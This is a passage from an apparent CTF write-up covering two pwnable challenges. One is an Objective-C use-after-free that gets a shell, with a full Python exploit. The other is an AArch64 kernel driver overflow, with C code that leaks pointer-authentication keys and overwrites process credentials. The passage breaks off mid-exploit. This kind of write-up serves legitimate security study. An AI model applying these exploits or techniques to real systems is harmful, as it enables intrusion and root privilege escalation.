        fgets(bufferInput, sizeof(bufferInput), stdin);
        choice = atoi(bufferInput);
        
        if (choice == 1) {
            Patient *p = [[Patient alloc] init];
            NSLog(@"Enter patient ID:");
            fgets(bufferInput, sizeof(bufferInput), stdin);
            bufferInput[strcspn(bufferInput, "\n")] = 0;
            NSString *pid = [NSString stringWithCString:bufferInput encoding:NSUTF8StringEncoding];
            NSLog(@"Enter vital status:");
            fgets(bufferInput, sizeof(bufferInput), stdin);
            int status = atoi(bufferInput);
            [p setPatientInfoWithId:pid status:status];
            [patients addObject:p];
            [p release];
            NSLog(@"Patient record created.");
        }
        else if (choice == 2) {
            NSLog(@"--- Patient Records ---");
            for (i = 0; i < [patients count]; i++) {
                NSLog(@"Index %d :", i);
                [[patients objectAtIndex:i] displayPatientInfo];
            }
        }
        else if (choice == 3) {
            NSLog(@"Enter patient index:");
            fgets(bufferInput, sizeof(bufferInput), stdin);
            int index = atoi(bufferInput);
            if (index >= 0 && index < [patients count]) {
                NSAutoreleasePool *tempPool = [[NSAutoreleasePool alloc] init];
                NSLog(@"Enter new patient ID:");
                fgets(bufferInput, sizeof(bufferInput), stdin);
                bufferInput[strcspn(bufferInput, "\n")] = 0;
                NSString *newID = [NSString stringWithFormat:@"%s", bufferInput];
                Patient *p = [patients objectAtIndex:index];
                
                if ([newID isEqual:p.patientID]) {
                    NSLog(@"Error: new patient ID is the same as the old one!");
                } else {
                    p.patientID = newID;
                    NSLog(@"ID modified!");
                }
                
                [tempPool drain];
            } else {
                NSLog(@"Invalid index.");
            }
        }
        else if (choice == 4) {
            if ([patients count] == 0) {
                NSLog(@"No patients available.");
            } else {
                NSLog(@"Enter patient index:");
                fgets(bufferInput, sizeof(bufferInput), stdin);
                int index = atoi(bufferInput);
                if (index >= 0 && index < [patients count]) {
                    NeuroReport *newReport = [[NeuroReport alloc] init];
                    newReport.associatedPatient = [[patients objectAtIndex:index] retain];
                    [newReport createReportWithSize:160];
                    [reports addObject:newReport];
                    [newReport.associatedPatient release];
                    [newReport release];
                    NSLog(@"Report generated.");
                } else {
                    NSLog(@"Invalid index.");
                }
            }
        }
        else if (choice == 5) {
            NSLog(@"Enter report index:");
            fgets(bufferInput, sizeof(bufferInput), stdin);
            int index = atoi(bufferInput);
            if (index >= 0 && index < [reports count]) {
                NeuroReport *r = [reports objectAtIndex:index];
                [r modifyReport];
            } else {
                NSLog(@"Invalid index.");
            }
        }
        else if (choice == 6) {
            NSLog(@"Enter patient index to check for cured status:");
            fgets(bufferInput, sizeof(bufferInput), stdin);
            int index = atoi(bufferInput);
            if (index >= 0 && index < [patients count]) {
                Patient *p = [patients objectAtIndex:index];
                Class patientIDClass = [p.patientID class];
                NSString *className = NSStringFromClass(patientIDClass);
                NSLog(@"%@", className);
                if ([className isEqualToString:@"Cured"]) {
                    NSLog(@"Patient is cured.");
                    system("/bin/sh");
                } else {
                    NSLog(@"Patient is not cured.");
                }
            } else {
                NSLog(@"Invalid index.");
            }
        }
        else if (choice == 7) {
            return 0;
        }
        else {
            NSLog(@"Invalid option.");
        }
        
    }
    
    [reports release];
    [patients release]; 
    [pool drain];
    return 0;
}
```

The goal of this challenge is changing the class name of the `patientID` to "Cured", which is not defined anywhere in the code.
This means that we have to create a maliciously-crafted object somehow.

```
Patient *p = [patients objectAtIndex:index];
Class patientIDClass = [p.patientID class];
NSString *className = NSStringFromClass(patientIDClass);
NSLog(@"%@", className);
if ([className isEqualToString:@"Cured"]) {
    NSLog(@"Patient is cured.");
    system("/bin/sh");
} else {
    NSLog(@"Patient is not cured.");
}
```

One suspicious thing I noticed was the type conversion from `NSString` to `id`.

```
@interface Patient : NSObject {
    id patientID; // Change: from NSString* to id
    NSInteger vitalStatus;
}
...
                NSString *newID = [NSString stringWithFormat:@"%s", bufferInput];
                Patient *p = [patients objectAtIndex:index];
                
                if ([newID isEqual:p.patientID]) {
                    NSLog(@"Error: new patient ID is the same as the old one!");
                } else {
                    p.patientID = newID;
                    NSLog(@"ID modified!");
                }
```

Before diving into the [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) itself, I first investigated how `NSString` is represented in memory.
The pointer at the start of each object indicates the type of the struct.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250416/20250416010357.png)

After updating the `id`, I noticed that the memory layout changed:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250416/20250416010823.png)

The `NSString` struct was clearly corrupted.
It turned out the object had already been freed and added to the tcache, confirming it was a classic use-after-free scenario.

Overlapping our data onto the freed `NSString` is straightforward.
However, in order to build a reliable fakeobj primitive, we need to know the heap address.

To leak the heap address, I decided to overlap a `Patient` struct instead of arbitrary data.
Then, by printing the id, I was able to trigger a heap leak.

It seems that when [Objective-C](https://d.hatena.ne.jp/keyword/Objective-C) encounters an object without a valid string conversion method, it falls back to printing the raw heap pointer.

```
# Leak heap address
create_patient("A"*0x10, 0x1234) # object @ 0x5770a0
modify_patient(0, "")            # make dangling pointer
create_patient("X"*0x10, 0x5432) # type confusion with size=0x30 chunk
display_patients()
addr_heap = int(sock.recvregex("Patient: (0x[0-9a-f]+)")[0], 16)
logger.info("heap = " + hex(addr_heap)
```

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250416/20250416011356.png)

With the leaked heap pointer, I was able to build a working fakeobj primitive.
Through trial and error while debugging, I managed to craft a fake [Objective-C](https://d.hatena.ne.jp/keyword/Objective-C) object whose class name was set to `"Cured"`.

During the process, I discovered that [Objective-C](https://d.hatena.ne.jp/keyword/Objective-C) attempts to call a function pointer to resolve the class name of an object.
This gave me control over RIP. However, I couldn’t directly call `system("/bin/sh")` due to a stack alignment issue.

From my observations, the function used to resolve the class name seems to return a heap pointer corresponding to a valid class name.
To work around the function pointer issue, I used a `mov rax, [rdi+8]; ret;` gadget, which allowed my fake object to return another controlled pointer.

This second fake object pointed to a location containing the string `"Cured"`, which satisfied the class name resolution logic.

```
from ptrlib import *
from tqdm import tqdm

def create_patient(pid: str, status: int):
    assert is_fgets_safe(pid)
    sock.sendlineafter("choice:\n", "1")
    sock.sendlineafter("patient ID:\n", pid)
    sock.sendlineafter("status:\n", status)

def display_patients():
    sock.sendlineafter("choice:\n", "2")

def modify_patient(index: int, pid: str):
    assert is_fgets_safe(pid)
    sock.sendlineafter("choice:\n", "3")
    sock.sendlineafter("patient index:\n", index)
    sock.sendlineafter("patient ID:\n", pid)

def create_report(index: int, content: str):
    assert is_fgets_safe(content)
    sock.sendlineafter("choice:\n", "4")
    sock.sendlineafter("patient index:\n", index)
    sock.sendlineafter("content:\n", content)

def modify_report(index: int, content: str):
    assert is_fgets_safe(content)
    sock.sendlineafter("choice:\n", "5")
    sock.sendlineafter("report index:\n", index)
    sock.sendlineafter("content:\n", content)

def check_cured(index: int):
    sock.sendlineafter("choice:\n", "6")
    sock.sendlineafter("for cured status:\n", index)


#sock = Socket("localhost", 4444)
sock = Socket("chall3.midnightflag.fr", 10651)
#sock.debug = True
#sock.hexdump = False

# Leak heap address
create_patient("A"*0x10, 0x1234) # object @ 0x5770a0
modify_patient(0, "")            # make dangling pointer
create_patient("X"*0x10, 0x5432) # type confusion with size=0x30 chunk
display_patients()
addr_heap = int(sock.recvregex("Patient: (0x[0-9a-f]+)")[0], 16)
logger.info("heap = " + hex(addr_heap))

# Win
create_patient("B"*0x10, 0x1234) # object @ 0x53e6d0
create_patient("C"*0x10, 0x5432)
modify_patient(2, "B"*(0xa8 - 0x28)) # type confusion with size=0xb0 chunk

addr_fake_id = addr_heap + 0xff450
fake_id  = b"A" * 0x10
fake_id += p64(addr_fake_id)
fake_id += p64(addr_fake_id + 0x70)
fake_id += p64(0x401b20) * ((0x40 - len(fake_id)) // 8) # mov rax, [rdi+8]; ret;

fake_id += p64(addr_fake_id + 0x50)
fake_id += b'B' * (0x50 - len(fake_id))

fake_id += p64(addr_fake_id + 0x58)
fake_id += p64(addr_fake_id)
fake_id += b"D"*0x18
fake_id += p64(0x1000)

fake_id += p64(addr_fake_id + 0x88)
fake_id += b"Cured\0"

fake_id += b"C" * (0x98 - len(fake_id))

SPRAY_NUM = 0x1000

payload  = b""
payload += b"4\n"
payload += b"1\n"
payload += fake_id + b"\n"
payload *= 0x100

for _ in tqdm(range(SPRAY_NUM // 0x100)):
    sock.send(payload)
    for _ in range(0x100):
        sock.recvuntil("Your choice:")

check_cured(2)
sock.sendline("cat flag.txt")

sock.sh()
```

## Sec Mem (500pt)

The last pwnable challenge was an Aarch64 [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel.
The kernel was running a vulnerable driver named `sec_mem`.

```
typedef ssize_t (*buffer_op_fn)(void *buffer, const void *data, size_t len, int64_t offset);

struct sec_mem_buffer {
    char buffer[BUFFER_SIZE];
    buffer_op_fn ops[3]; 
};

static struct sec_mem_buffer device_global_struct;

struct sec_mem_ioctl_data {
    size_t length;
    uint64_t op_index; 
    char buffer[BUFFER_SIZE];
    int64_t offset;
};

...

ssize_t buffer_copy_from_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(buffer, data, len);
    return len;
}

ssize_t buffer_copy_to_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(data, buffer + offset, len);
    return len;
}

ssize_t buffer_clear(void *buffer, const void *data, size_t len, int64_t offset) {
    memset(buffer, 0, BUFFER_SIZE);  
    return BUFFER_SIZE;  
}

...

static void *autiza(void *ptr) {
    __asm__ volatile (
        "autiza %0"  
    : "+r" (ptr)    
    );
    return ptr;  
}

static void sec_mem_init_ops(void) {
    device_global_struct.ops[0] = buffer_copy_from_user;
    device_global_struct.ops[1] = buffer_copy_to_user; 
    device_global_struct.ops[2] = buffer_clear;

    for (int i = 0; i < 3; i++) {
        device_global_struct.ops[i] = paciza(device_global_struct.ops[i]);
    }
}

static int sec_mem_open(struct inode *inode, struct file *file) {
    if (!mutex_trylock(&mutex)) {
        pr_err("Device is already open!\n");
        return -EBUSY;
    }

    sec_mem_init_ops();
    return 0;
}

static long sec_mem_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {

    if (cmd == sec_mem_IOC_SET_OPERATION) {
        if (copy_from_user(&data, (struct sec_mem_ioctl_data *)arg, sizeof(data))) {
            return -EFAULT;
        }

        if (data.op_index >= 3) { 
            return -EINVAL;
        }

    void *auth_ptr = autiza(device_global_struct.ops[data.op_index]);

        if (!auth_ptr) {
            return -EACCES; 
        }

        buffer_op_fn op = (buffer_op_fn)auth_ptr;
        ssize_t result = op(device_global_struct.buffer, &data.buffer, data.length, data.offset);
        if (result < 0) {
            return result;
        }

        if (copy_to_user(arg, &data, sizeof(data))){
            return -EFAULT;
        }

        return 0;
    }

    return -EINVAL;
}
```

The driver defines several I/O handlers that operate on a global variable named `device_global_struct`, which contains a buffer and three function pointers.
The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) lies in both `buffer_copy_from_user` and `buffer_copy_to_user`.

```
struct sec_mem_buffer {
    char buffer[BUFFER_SIZE];
    buffer_op_fn ops[3]; 
};

...

ssize_t buffer_copy_from_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(buffer, data, len);
    return len;
}

ssize_t buffer_copy_to_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(data, buffer + offset, len);
    return len;
}
```

These functions incorrectly check whether the provided length exceeds `sizeof(struct sec_mem_buffer)`, when the proper check should have been against `BUFFER_SIZE`.
This mistake allows for a buffer overflow, enabling us to overwrite the function pointers stored in the structure.

Additionally, `buffer_copy_to_user` accepts an offset as an argument, which it uses to determine where to read data from.
However, there is no validation on this offset, meaning we can use it to read from arbitrary 64-bit memory addresses.

The main challenge, however, lies in dealing with pointer authentication.
The driver uses the `paciza` instruction to [sign](https://d.hatena.ne.jp/keyword/sign) function pointers and `autiza` to authenticate them before invocation.
This prevents us from simply overwriting the function pointers with arbitrary values.

```
static void *paciza(void *ptr) {
    __asm__ volatile (
        "paciza %0" 
    : "+r" (ptr)    
    );
    return ptr;
}

static void *autiza(void *ptr) {
    __asm__ volatile (
        "autiza %0"  
    : "+r" (ptr)    
    );
    return ptr;  
}
```

This protection mechanism is called Pointer Authentication (PAC), a mitigation unique to ARM architecture processors.

The three function pointers mentioned ealier are protected using PAC.
If you inspect their values in memory, you'll notice that the highest 16 bits of each pointer appear to be random:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250422/20250422141746.png)

These are the signatures added by the `paciza` instruction.
These signatures are cryptographic tags calculated based on the pointer [value](https://d.hatena.ne.jp/keyword/value) and a modifier, and they're used to ensure the integrity of function pointers.
When the function is called, `autiza` is used to verify and strip the signature.
If the verification fails, the kernel panics.

So, how do we bypass PAC?

Fortunately, the missing offset validation in `buffer_copy_to_user` gives us a powerful arbitrary address read (AAR) primitive from kernel memory.
This allows us to search through memory regions.

PAC keys are 16-byte length random values, and each context (e.g., process or thread) can have up to five of them:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250422/20250422143326.png)

bata-gef was very helpful to list the keys

Since the driver uses `paciza` and `autiza`, the relevant key is `APIAKEY`.

Now, under normal conditions, PAC keys are stored in dedicated system registers and not directly accessible.
However, when the kernel switches context, it must save and restore these registers, meaning the PAC keys are temporarily stored in memory.

With our kernel-level AAR primitive, we can scan through memory looking for these saved contexts and extract the [value](https://d.hatena.ne.jp/keyword/value) of `APIAKEY`.

Once the key is recovered, we can use it to manually compute valid PAC tags for arbitrary function pointers, allowing us to craft a payload that passes pointer authentication and gains code execution.

To extract the PAC key, I wrote a quick-and-dirty code using some unstable heuristics to scan memory for potential key values. It worked, but wasn't very reliable.

The challenge author's intended solution is much cleaner.
He traverse the `task_struct` to locate the saved context and extract the PAC keys directly.
That approach is definitely more stable and robust.

If you're interested in a more elegant method, I highly recommend reading [the author's writeup](https://blog.itarow.xyz/posts/mctf_2025_sec_mem/).

```
  /* Leak map base */
  size_t leak[0x400 / 8];
  size_t base;

  size_t map_base = 0;
  base = 0xffff800080003000ULL;
  while (base < 0xffff800080004000ULL) {
    char *p;
    AAR(base, leak, 0x400);
    if (p = memmem(leak, 0x400, MAGIC, 0x10)) {
      map_base = *(size_t*)(p + 0x80);
      break;
    }
    base += 0x400;
  }
  map_base &= 0xfffffffff0000000;
  printf("direct map: 0x%016lx\n", map_base);
  if (map_base == 0) {
    puts("[-] Bad luck");
    exit(1);
  }

  /* Leak PAC keys */
  size_t key0 = 0, key1 = 0;
  base = map_base;
  while (base < map_base + 0x8000000) {
    AAR(base + 0xe00, leak, 0x100);
    if (leak[6] == 0xffffffff &&
        map_base < leak[11] && leak[11] < map_base + 0x8000000) {
      AAR(leak[11], leak, 0x10);
      pac = ~pauth_computepac_architected(pac1 | 0xffff000000000000, 0, leak[1], leak[0]);

      if ((pac >> 48) == (pac1 >> 48)) {
        key0 = leak[1];
        key1 = leak[0];
        printf("[+] Found APIAKEY at 0x%016lx: %016lx %016lx\n", leak[11], key0, key1);
        
        // Double check
        pac = ~pauth_computepac_architected(pac2 | 0xffff000000000000, 0, key0, key1);
        if ((pac >> 48) == (pac2 >> 48)) {
          break;
        }

        puts("[+] Double check failed");
      } else {
        printf("[-] Nope %04lx != %04lx\n", (pac >> 48), (pac1 >> 48));
      }
    }
    base += 0x1000;
  }
  if (key0 == 0 && key1 == 0) {
    puts("[-] Bad luck: Key not found");
    exit(1);
  }
```

Now that we have control over the program counter (PC).
What's next?

Unfortunately, PXN and PAN (the ARM equivalents of [Intel](https://d.hatena.ne.jp/keyword/Intel)'s SMEP and [SMAP](https://d.hatena.ne.jp/keyword/SMAP)) are enabled.
This means we can't simply jump to shellcode located in userland memory.

The challenge author's intended solution was to call `call_usermodehelper` to execute a system command with root privileges.
I considered that approach, but decided to take a different path.

When I gained control over PC, I noticed that some of the general-purpose registers (either passed as function arguments or leftover from previous instructions) were also controllable.

```
$x0      : 0xffff800078c825a0  ->  0x4141414141414141
$x1      : 0xffff800078c82a40  ->  0x4141414141414141
$x2      : 0x000000000000dead
$x3      : 0x000000000000fee1
$x4      : 0xffff8000deadbeef
$x5      : 0xffff800078c82e48  ->  0x0000000000000000
$x6      : 0xffff800078c82e48  ->  0x0000000000000000
$x7      : 0x4141414141414141 ('AAAAAAAA'?)
$x8      : 0x000000000000fee1
$x9      : 0x4141414141414141 ('AAAAAAAA'?)
$x10     : 0x4141414141414141 ('AAAAAAAA'?)
$x11     : 0x4141414141414141 ('AAAAAAAA'?)
$x12     : 0x4141414141414141 ('AAAAAAAA'?)
$x13     : 0x4141414141414141 ('AAAAAAAA'?)
$x14     : 0x4141414141414141 ('AAAAAAAA'?)
$x15     : 0x00000000004a1978
...
```

Specifically, by calling a ROP gadget like:

```
str x2, [x3]
```

I could perform an arbitrary 64-bit write to any memory address, using `x2` as the [value](https://d.hatena.ne.jp/keyword/value) and `x3` as the [destination](https://d.hatena.ne.jp/keyword/destination). (I [learned this technique from pr0cf5](https://pr0cf5.github.io/ctf/the-plight-of-tty-in-the-linux-kernel/) 5 years ago! It's been more than 5 years since I started learning pwnable!)

As there is no limit on the number of function calls, this allowed me to perform further memory manipulation.
I used this arbitrary address write ([AAW](https://d.hatena.ne.jp/keyword/AAW)) primitive to overwrite the `cred` structure of the exploit process.

Here is the full exploit:

```
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <unistd.h>

#define MAKE_64BIT_MASK(shift, length) \
    (((~0ULL) >> (64 - (length))) << (shift))

static inline uint64_t deposit64(uint64_t value, int start, int length,
                                 uint64_t fieldval)
{
    uint64_t mask;
    assert(start >= 0 && length > 0 && length <= 64 - start);
    mask = (~0ULL >> (64 - length)) << start;
    return (value & ~mask) | ((fieldval << start) & mask);
}

static inline int64_t sextract64(uint64_t value, int start, int length)
{
    assert(start >= 0 && length > 0 && length <= 64 - start);
    /* Note that this implementation relies on right shift of signed
     * integers being an arithmetic shift.
     */
    return ((int64_t)(value << (64 - length - start))) >> (64 - length);
}

static inline uint32_t extract32(uint32_t value, int start, int length)
{
    assert(start >= 0 && length > 0 && length <= 32 - start);
    return (value >> start) & (~0U >> (32 - length));
}

static int rot_cell(int cell, int n)
{
    /* 4-bit rotate left by n.  */
    cell |= cell << 4;
    return extract32(cell, 4 - n, 4);
}


static inline uint64_t extract64(uint64_t value, int start, int length)
{
    assert(start >= 0 && length > 0 && length <= 64 - start);
    return (value >> start) & (~0ULL >> (64 - length));
}

static uint64_t pac_cell_shuffle(uint64_t i)
{
    uint64_t o = 0;

    o |= extract64(i, 52, 4);
    o |= extract64(i, 24, 4) << 4;
    o |= extract64(i, 44, 4) << 8;
    o |= extract64(i,  0, 4) << 12;

    o |= extract64(i, 28, 4) << 16;
    o |= extract64(i, 48, 4) << 20;
    o |= extract64(i,  4, 4) << 24;
    o |= extract64(i, 40, 4) << 28;

    o |= extract64(i, 32, 4) << 32;
    o |= extract64(i, 12, 4) << 36;
    o |= extract64(i, 56, 4) << 40;
    o |= extract64(i, 20, 4) << 44;

    o |= extract64(i,  8, 4) << 48;
    o |= extract64(i, 36, 4) << 52;
    o |= extract64(i, 16, 4) << 56;
    o |= extract64(i, 60, 4) << 60;

    return o;
}


static uint64_t pac_cell_inv_shuffle(uint64_t i)
{
    uint64_t o = 0;

    o |= extract64(i, 12, 4);
    o |= extract64(i, 24, 4) << 4;
    o |= extract64(i, 48, 4) << 8;
    o |= extract64(i, 36, 4) << 12;

    o |= extract64(i, 56, 4) << 16;
    o |= extract64(i, 44, 4) << 20;
    o |= extract64(i,  4, 4) << 24;
    o |= extract64(i, 16, 4) << 28;

    o |= i & MAKE_64BIT_MASK(32, 4);
    o |= extract64(i, 52, 4) << 36;
    o |= extract64(i, 28, 4) << 40;
    o |= extract64(i,  8, 4) << 44;

    o |= extract64(i, 20, 4) << 48;
    o |= extract64(i,  0, 4) << 52;
    o |= extract64(i, 40, 4) << 56;
    o |= i & MAKE_64BIT_MASK(60, 4);

    return o;
}

static uint64_t pac_sub(uint64_t i)
{
    static const uint8_t sub[16] = {
        0xb, 0x6, 0x8, 0xf, 0xc, 0x0, 0x9, 0xe,
        0x3, 0x7, 0x4, 0x5, 0xd, 0x2, 0x1, 0xa,
    };
    uint64_t o = 0;
    int b;

    for (b = 0; b < 64; b += 4) {
        o |= (uint64_t)sub[(i >> b) & 0xf] << b;
    }
    return o;
}

static uint64_t pac_inv_sub(uint64_t i)
{
    static const uint8_t inv_sub[16] = {
        0x5, 0xe, 0xd, 0x8, 0xa, 0xb, 0x1, 0x9,
        0x2, 0x6, 0xf, 0x0, 0x4, 0xc, 0x7, 0x3,
    };
    uint64_t o = 0;
    int b;

    for (b = 0; b < 64; b += 4) {
        o |= (uint64_t)inv_sub[(i >> b) & 0xf] << b;
    }
    return o;
}


static uint64_t pac_mult(uint64_t i)
{
    uint64_t o = 0;
    int b;

    for (b = 0; b < 4 * 4; b += 4) {
        int i0, i4, i8, ic, t0, t1, t2, t3;

        i0 = extract64(i, b, 4);
        i4 = extract64(i, b + 4 * 4, 4);
        i8 = extract64(i, b + 8 * 4, 4);
        ic = extract64(i, b + 12 * 4, 4);

        t0 = rot_cell(i8, 1) ^ rot_cell(i4, 2) ^ rot_cell(i0, 1);
        t1 = rot_cell(ic, 1) ^ rot_cell(i4, 1) ^ rot_cell(i0, 2);
        t2 = rot_cell(ic, 2) ^ rot_cell(i8, 1) ^ rot_cell(i0, 1);
        t3 = rot_cell(ic, 1) ^ rot_cell(i8, 2) ^ rot_cell(i4, 1);

        o |= (uint64_t)t3 << b;
        o |= (uint64_t)t2 << (b + 4 * 4);
        o |= (uint64_t)t1 << (b + 8 * 4);
        o |= (uint64_t)t0 << (b + 12 * 4);
    }
    return o;
}

static uint64_t tweak_cell_rot(uint64_t cell)
{
    return (cell >> 1) | (((cell ^ (cell >> 1)) & 1) << 3);
}

static uint64_t tweak_shuffle(uint64_t i)
{
    uint64_t o = 0;

    o |= extract64(i, 16, 4) << 0;
    o |= extract64(i, 20, 4) << 4;
    o |= tweak_cell_rot(extract64(i, 24, 4)) << 8;
    o |= extract64(i, 28, 4) << 12;

    o |= tweak_cell_rot(extract64(i, 44, 4)) << 16;
    o |= extract64(i,  8, 4) << 20;
    o |= extract64(i, 12, 4) << 24;
    o |= tweak_cell_rot(extract64(i, 32, 4)) << 28;

    o |= extract64(i, 48, 4) << 32;
    o |= extract64(i, 52, 4) << 36;
    o |= extract64(i, 56, 4) << 40;
    o |= tweak_cell_rot(extract64(i, 60, 4)) << 44;

    o |= tweak_cell_rot(extract64(i,  0, 4)) << 48;
    o |= extract64(i,  4, 4) << 52;
    o |= tweak_cell_rot(extract64(i, 40, 4)) << 56;
    o |= tweak_cell_rot(extract64(i, 36, 4)) << 60;

    return o;
}

static uint64_t tweak_cell_inv_rot(uint64_t cell)
{
    return ((cell << 1) & 0xf) | ((cell & 1) ^ (cell >> 3));
}

static uint64_t tweak_inv_shuffle(uint64_t i)
{
    uint64_t o = 0;

    o |= tweak_cell_inv_rot(extract64(i, 48, 4));
    o |= extract64(i, 52, 4) << 4;
    o |= extract64(i, 20, 4) << 8;
    o |= extract64(i, 24, 4) << 12;

    o |= extract64(i,  0, 4) << 16;
    o |= extract64(i,  4, 4) << 20;
    o |= tweak_cell_inv_rot(extract64(i,  8, 4)) << 24;
    o |= extract64(i, 12, 4) << 28;

    o |= tweak_cell_inv_rot(extract64(i, 28, 4)) << 32;
    o |= tweak_cell_inv_rot(extract64(i, 60, 4)) << 36;
    o |= tweak_cell_inv_rot(extract64(i, 56, 4)) << 40;
    o |= tweak_cell_inv_rot(extract64(i, 16, 4)) << 44;

    o |= extract64(i, 32, 4) << 48;
    o |= extract64(i, 36, 4) << 52;
    o |= extract64(i, 40, 4) << 56;
    o |= tweak_cell_inv_rot(extract64(i, 44, 4)) << 60;

    return o;
}


static uint64_t pauth_computepac_architected(uint64_t data, uint64_t modifier,
                                             uint64_t key0, uint64_t key1)
{
    static const uint64_t RC[5] = {
        0x0000000000000000ull,
        0x13198A2E03707344ull,
        0xA4093822299F31D0ull,
        0x082EFA98EC4E6C89ull,
        0x452821E638D01377ull,
    };
    const uint64_t alpha = 0xC0AC29B7C97C50DDull;
    /*
     * Note that in the ARM pseudocode, key0 contains bits <127:64>
     * and key1 contains bits <63:0> of the 128-bit key.
     */
    uint64_t workingval, runningmod, roundkey, modk0;
    int i;

    modk0 = (key0 << 63) | ((key0 >> 1) ^ (key0 >> 63));
    runningmod = modifier;
    workingval = data ^ key0;

    for (i = 0; i <= 4; ++i) {
        roundkey = key1 ^ runningmod;
        workingval ^= roundkey;
        workingval ^= RC[i];
        if (i > 0) {
            workingval = pac_cell_shuffle(workingval);
            workingval = pac_mult(workingval);
        }
        workingval = pac_sub(workingval);
        runningmod = tweak_shuffle(runningmod);
    }
    roundkey = modk0 ^ runningmod;
    workingval ^= roundkey;
    workingval = pac_cell_shuffle(workingval);
    workingval = pac_mult(workingval);
    workingval = pac_sub(workingval);
    workingval = pac_cell_shuffle(workingval);
    workingval = pac_mult(workingval);
    workingval ^= key1;
    workingval = pac_cell_inv_shuffle(workingval);
    workingval = pac_inv_sub(workingval);
    workingval = pac_mult(workingval);
    workingval = pac_cell_inv_shuffle(workingval);
    workingval ^= key0;
    workingval ^= runningmod;
    for (i = 0; i <= 4; ++i) {
        workingval = pac_inv_sub(workingval);
        if (i < 4) {
            workingval = pac_mult(workingval);
            workingval = pac_cell_inv_shuffle(workingval);
        }
        runningmod = tweak_inv_shuffle(runningmod);
        roundkey = key1 ^ runningmod;
        workingval ^= RC[4 - i];
        workingval ^= roundkey;
        workingval ^= alpha;
    }
    workingval ^= modk0;

    return workingval;
}

#define BUFFER_SIZE 1024

struct sec_mem_ioctl_data {
    size_t length;
    uint64_t op_index; 
    char buffer[BUFFER_SIZE];
    int64_t offset;
} data;

int fd;
size_t buffer_base, kbase;

void AAR(size_t addr, void *buf, size_t size) {
  assert (size <= 0x400);
  data.length = size;
  data.op_index = 1;
  data.offset = addr - buffer_base;
  assert (ioctl(fd, 0x40046b03, &data) >= 0);
  memcpy(buf, data.buffer, size);
}

#define MAGIC "\x5a\x13\x00\x00\x00\x00\x00\x00\x5a\x13\x00\x00\x00\x00\x00\x00"

#define swapper_task (kbase + 0xb019c0)
#define init_task (kbase + 0xb08f08)
#define commit_creds (kbase + 0x58204)
#define rop_str_x2_px3 (kbase + 0x40414c)

int main() {
  prctl(PR_SET_NAME, "NEKONEKO");
  /* test
  uint64_t x = pauth_computepac_architected(
    0xffff800078c80018, 0,
    0x0eccb0d3cbb49ff1, 0xe6f4ecb38753420d
  );
  printf("%016lx %016lx\n", x, 0xc443741fa33c470a);
  return 0;
  //*/

  fd = open("/dev/sec_mem", O_RDWR);

  /* Leak pointers */
  data.length = 0x100;
  data.op_index = 1;
  data.offset = 0x400;
  assert (ioctl(fd, 0x40046b03, &data) >= 0);

  uint64_t pac;
  size_t pac1 = *(size_t*)(data.buffer);
  size_t pac2 = *(size_t*)(data.buffer + 8);
  size_t pac3 = *(size_t*)(data.buffer + 0x10);
  buffer_base = *(size_t*)(data.buffer + 0x30) - 0x430;
  kbase = *(size_t*)(data.buffer + 0x50) - 0xb894e8;

  printf("pac1: 0x%016lx\n", pac1);
  printf("pac2: 0x%016lx\n", pac2);
  printf("pac3: 0x%016lx\n", pac3);
  printf("buffer: 0x%016lx\n", buffer_base);
  printf("kbase: 0x%016lx\n", kbase);

  /* Leak cred */
  size_t task = swapper_task;
  size_t cred;

  char name[8];
  while (1) {
    printf("[+] Traversing task @ 0x%016lx...\n", task);
    AAR(task + 0x340, &task, 8);
    task = task - 0x338;
    AAR(task + 0x5e8, name, 8);
    if (memcmp(name, "NEKONEKO", 8) == 0) {
      printf("[+] exploit task_struct: 0x%016lx\n", task);
      AAR(task + 0x5e0, &cred, 8);
      printf("[+] exploit cred: 0x%016lx\n", cred);
      break;
    }
  }

  /* Leak map base */
  size_t leak[0x400 / 8];
  size_t base;

  size_t map_base = 0;
  base = 0xffff800080003000ULL;
  while (base < 0xffff800080004000ULL) {
    char *p;
    AAR(base, leak, 0x400);
    if (p = memmem(leak, 0x400, MAGIC, 0x10)) {
      map_base = *(size_t*)(p + 0x80);
      break;
    }
    base += 0x400;
  }
  map_base &= 0xfffffffff0000000;
  printf("direct map: 0x%016lx\n", map_base);
  if (map_base == 0) {
    puts("[-] Bad luck");
    exit(1);
  }

  /* Leak PAC keys */
  size_t key0 = 0, key1 = 0;
  base = map_base;
  while (base < map_base + 0x8000000) {
    AAR(base + 0xe00, leak, 0x100);
    if (leak[6] == 0xffffffff &&
        map_base < leak[11] && leak[11] < map_base + 0x8000000) {
      AAR(leak[11], leak, 0x10);
      pac = ~pauth_computepac_architected(pac1 | 0xffff000000000000, 0, leak[1], leak[0]);

      if ((pac >> 48) == (pac1 >> 48)) {
        key0 = leak[1];
        key1 = leak[0];
        printf("[+] Found APIAKEY at 0x%016lx: %016lx %016lx\n", leak[11], key0, key1);
        
        // Double check
        pac = ~pauth_computepac_architected(pac2 | 0xffff000000000000, 0, key0, key1);
        if ((pac >> 48) == (pac2 >> 48)) {
          break;
        }

        puts("[+] Double check failed");
      } else {
        printf("[-] Nope %04lx != %04lx\n", (pac >> 48), (pac1 >> 48));
      }
    }
    base += 0x1000;
  }
  if (key0 == 0 && key1 == 0) {
